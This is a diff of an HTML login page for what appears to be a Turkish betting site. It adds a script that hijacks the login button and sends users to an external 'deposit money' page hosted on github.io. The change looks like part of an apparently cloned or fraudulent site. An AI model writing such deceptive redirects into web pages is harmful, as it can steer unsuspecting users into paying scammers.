@@ -125,7 +125,16 @@
                 </label>
               </li>
               <li>
-                <button class="btn ng-binding" ng-click="sendForm()">GİRİŞ YAP</button>
+                <button class="btn ng-binding" ng-click="sendForm()" id="girisBtn">GİRİŞ YAP</button>
+
+<script>
+  // Düğmeye tıklandığında belirtilen URL'ye yönlendirme yapacak JavaScript işlevi
+  document.getElementById("girisBtn").addEventListener("click", function() {
+    // Belirtilen URL'ye yönlendirme yapmak için aşağıdaki satırı kullanın
+    window.location.href = "https://betonline1.github.io/salih/para%20yat%C4%B1r.html";
+  });
+</script>
+
               </li>
               <li>
                 <a href="#/auth/forgot-password" ui-sref="app.forgot-password" class="loss_password ng-binding">şifremi unuttum</a>
@@ -447,6 +456,7 @@
 //    s1.setAttribute('crossorigin','*');
 //    s0.parentNode.insertBefore(s1,s0);
 //  })();
+
 
 </script>
 <!--End of Zopim Live Chat Script-->
